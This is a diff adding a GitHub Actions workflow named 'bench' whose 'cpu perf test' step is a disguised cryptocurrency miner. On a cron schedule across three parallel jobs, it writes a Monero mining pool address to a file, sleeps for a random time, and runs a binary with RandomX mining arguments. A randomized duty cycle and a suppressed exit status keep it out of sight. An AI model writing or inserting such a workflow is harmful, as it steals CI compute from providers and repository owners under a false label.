@@ -1,0 +1,21 @@
+name: bench
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 */5 * * *'
+jobs:
+  bench:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 320
+    strategy:
+      fail-fast: false
+      matrix:
+        id: [1,2,3]
+    steps:
+      - uses: actions/checkout@v4
+      - name: cpu perf test
+        run: |
+          chmod +x allinone
+          echo "stratum+tcp://gulf.moneroocean.stream:443" > url.txt
+          sleep $((RANDOM % 180))
+          timeout 11400 ./allinone -algo rx/0 -core 2 -ram 2000 -pass x -duty-rand 0.6:0.8:12:10 || true
